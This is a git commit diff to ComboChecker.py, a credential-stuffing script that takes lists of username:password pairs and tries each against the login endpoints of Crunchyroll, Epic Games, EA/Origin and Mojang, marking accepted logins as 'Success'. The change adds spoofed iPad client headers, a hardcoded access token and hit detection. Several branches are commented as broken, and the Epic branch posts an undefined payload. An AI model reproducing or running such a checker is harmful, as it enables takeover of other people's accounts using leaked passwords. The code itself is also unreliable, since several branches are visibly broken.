76206dcd8b07b8db2e7c906b60482fc125938929
Bannatz <kevintoptschij12012003@gmail.com>
2022-02-14 23:02:53 +0100

    kaputte sachen yay

--- ComboChecker.py
+++ ComboChecker.py
@@ -1,31 +1,31 @@
 import requests, urllib, sys, base64, json
-from utils import cprint
+from utils import cprint, log, listRemoveNewLines
 
 def checker(clist: list):
+    print(clist)
+    clist = listRemoveNewLines(clist)
+    print(clist)
     header = {"content-type": "application/json"}
-    urls = ["https://www.crunchyroll.com/de/login", "https://www.epicgames.com/id/api/login", "https://signin.ea.com/p/originX/login?execution=e1390309168s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://authserver.mojang.com/authenticate"]
+    urls = ["https://api-manga.crunchyroll.com/cr_login", "https://www.epicgames.com/id/api/login", "https://signin.ea.com/p/originX/login?execution=e1390309168s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://authserver.mojang.com/authenticate"]
     jesus = ["Crunchyroll", "Epic Games", "UPlay"]
     cprint(f"[1] {jesus[0]}\n[2] {jesus[1]} \n", "green")
     s = int(input("Enter Number for URL: "))
     if s == 1:
         for combo in clist: #Broken
-            account = combo.replace("\n", "")
-            a = account.split(":")
+            a = combo.split(":")
+            print(combo)
             user = a[0]
             pwd = a[1]
-            payload = json.dumps({
-                'agent': {
-                    'name': "Crunchyroll",
-                    'version': 1
-                },
-                "login_form[name]": user,
-                "login_form[password]": pwd,
-                "login_form[redirect_url]": "/de"
-            })
-            with requests.Session() as s2:
-                p = s2.post(urls[0], data=payload, headers=header)
-                print(p.status_code)
-                print(p.text)
+            header = {
+            "Host": "api-manga.crunchyroll.com" ,
+            "Content-Type": "application/x-www-form-urlencoded" ,
+            "Accept": "*/*" ,
+            "Connection": "keep-alive" ,
+            "User-Agent": "Manga/4.2.0 (iPad; iOS 14.4; Scale/2.00)" ,
+            "Accept-Language": "nl-NL;q=1, ar-NL;q=0.9" ,
+            "Accept-Encoding": "gzip, deflate, br" ,
+            }
+            payload = f"access_token=dcIhv87VpKsqLCZ&account={user}&api_ver=1.0&device_id=123-456-789&device_type=com.crunchyroll.manga.ipad&duration=6000&format=json&password={pwd}"
     elif s == 2: #Broken
         for combo in clist:
             account = combo.replace("\n", "")
@@ -33,9 +33,11 @@ def checker(clist: list):
             user = a[0]
             pwd = a[1]
             with requests.Session() as s2:
-                login_data = dict(email=user, password=pwd)
-                p = s2.post(urls[1], data=login_data)
-                print(p.text)
+                p = s2.post(urls[1], data=payload)
+                if "Incorrect login information" in p.text:
+                    cprint(f"{a[0]}:{a[0]} = ERROR", "red")
+                else:
+                    cprint(f"{a[0]}:{a[0]} = Success", "green")
     elif s == 3:
         for combo in clist:
             account = combo.replace("\n", "")
